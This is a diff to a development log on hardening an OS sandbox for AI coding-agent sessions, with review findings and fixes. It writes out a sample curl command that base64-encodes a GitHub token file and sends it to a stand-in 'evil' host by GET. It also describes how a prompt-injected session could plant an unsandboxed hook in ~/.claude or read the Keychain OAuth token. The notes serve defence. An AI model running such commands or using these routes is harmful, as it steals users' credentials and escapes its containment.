@@ -1076,6 +1076,48 @@ Tests: **102/102** (replaced the SDK-`sandboxSettings`/`SANDBOX_MARKER` tests wi
 proxy is the way (proven in `m41-spike/proxy-verify.mjs`) — or adopt `@anthropic-ai/sandbox-runtime`
 which bundles it. Left out now by his capability-first choice.
 
+#### Review-2 (2 Fable agents) + address — filesystem holes tightened (2026-07-16)
+
+The rebuild got a 2-agent /review-2. No bugs in the wrap itself (writes confined, fail-closed real,
+spawn/IPC/kill sound — SBPL is last-match-wins, so deny-before-allow works), but **both agents
+corroborated two reachable filesystem-containment holes** the "safety net" was supposed to close.
+Both fixed; both respect the open-network choice (reads/writes only):
+
+- **🔴 Writable `~/.claude` → unsandboxed RCE + persistence.** The profile made `~/.claude` writable
+  (checkpoints need it), but it also holds `settings.json`/`hooks`/`plugins`/`agents`/`skills`/
+  `commands`/`CLAUDE.md` — which execute in the user's *next interactive* session, OUTSIDE this
+  sandbox. `protectedPathHit` hard-denies the file TOOLS on `~/.claude` but skips Bash, and the OS
+  sandbox allowed the write — so a bash `>> ~/.claude/settings.json` could drop a `SessionStart`
+  command hook (no `ESCALATE_BASH` match → auto-allowed) that runs unsandboxed later. **Fix:** re-deny
+  those exec surfaces *after* the `~/.claude` allow (last-match-wins, verified: `settings.json` write
+  BLOCKED while `file-history` stays writable → checkpointing/undo still work), and drop the
+  `~/.claude.json` write-allow (MCP/trust-injection surface).
+- **🔴 Readable credential dotfiles → token exfil over the open net.** Only `.env`/`.ssh`/`.aws` were
+  read-denied; `~/.config/gh` (a live GitHub OAuth token, present on this machine), `~/.npmrc`,
+  `~/.netrc`, `~/.docker/config.json`, `~/.kube`, `~/.gnupg`, `~/.config/gcloud` stayed readable → a
+  bash `curl "http://evil/?d=$(base64 < ~/.config/gh/hosts.yml)"` — a **GET**, so the network-SEND
+  escalation (POST-only) misses it — leaks a bearer credential. **Fix:** extend `readDenied` (verified:
+  gh DENIED at the sandbox level, `package.json` still readable). This makes the "secrets unreadable"
+  exfil-net claim actually true for on-disk credential *files*.
+- **🟡s:** custom-spawn stderr `'pipe'` was never drained (SDK only drains its own spawn) → backpressure
+  deadlock risk → `'inherit'`; a config flip to `failIfUnavailable:false` on an unsupported platform
+  would silently run UNSANDBOXED → now emits a `claude.sandbox {unconfined:true}` audit event; empty
+  `cwd`/`taskId` would emit `(subpath "")` and re-open all writes → guard throws; the now-inverted
+  "sandbox governs only bash" comments (supervisor.ts/config.ts/tests) corrected — the OS layer covers
+  the file tools too now, so `protectedPathHit` stays as belt-and-suspenders (clean message + the one
+  `~/.claude`-read case the OS layer intentionally leaves open). Profile ordering + credential/exec-
+  surface denies are now asserted in tests. 103/103.
+
+**Residual, stated honestly (only the network-deny proxy closes it — accepted under the user's
+open-network choice):** the CLI itself must read `~/.claude` (its transcripts, config) and the
+macOS **Keychain** (the claude.ai OAuth token — subscription auth), and `allow default` grants both
+to bash too. So a prompt-injected session can still `cat ~/.claude/projects/**` (other sessions'
+history) or `security find-generic-password …` (the OAuth token) and GET-exfil them. This can't be
+closed while keeping the session working *and* the network open in a single Seatbelt layer — it needs
+the loopback filtering proxy (network default-deny) from `m41-spike/proxy-verify.mjs`. Flagged for
+the user; left as his capability-first call. The *fixable* credential surfaces (repo `.env`, gh/npm/
+cloud tokens, ssh/aws/gnupg) ARE now closed.
+
 ---
 
 ## Firecrawl content acquisition — scrape/crawl/map/extract for background agents — 2026-07-15
